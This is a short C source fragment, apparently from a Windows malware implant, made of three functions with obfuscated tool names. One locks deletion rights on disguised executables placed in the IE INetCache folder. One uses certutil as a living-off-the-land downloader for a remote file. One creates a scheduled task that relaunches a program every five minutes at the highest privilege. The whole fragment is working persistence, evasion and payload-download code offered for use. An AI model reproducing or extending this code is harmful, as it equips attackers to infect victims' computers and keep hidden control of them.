/* === Obfuscated harden files === */
void obf_sys_harden_files(void) {
    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
    
    char cmd[2048];
    char *icacls = obf_icacls();
    snprintf(cmd, sizeof(cmd),
        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\ElevationService.exe\" /deny Everyone:(DE,DC) /c /q && "
        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\CrashHandler.exe\" /deny Everyone:(DE,DC) /c /q && "
        "%s \"%s\\Microsoft\\Windows\\INetCache\\IE\\NotifyService.exe\" /deny Everyone:(DE,DC) /c /q",
        icacls, localAppData,
        icacls, localAppData,
        icacls, localAppData);
    sys_run_command(cmd);
}

/* === Obfuscated LOLBAS download === */
void obf_sys_lolbas_download(const char *url, const char *outPath) {
    char cmd[1024];
    char *certutil = obf_certutil();
    snprintf(cmd, sizeof(cmd), "%s -urlcache -split -f \"%s\" \"%s\"", certutil, url, outPath);
    sys_run_command(cmd);
}

/* === Obfuscated scheduled task === */
void obf_ensure_scheduled_task(const char *exePath, const char *taskName) {
    char cmd[1024];
    char *schtasks = obf_schtasks();
    snprintf(cmd, sizeof(cmd),
        "%s /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
        schtasks, taskName, exePath);
    sys_run_command(cmd);
}
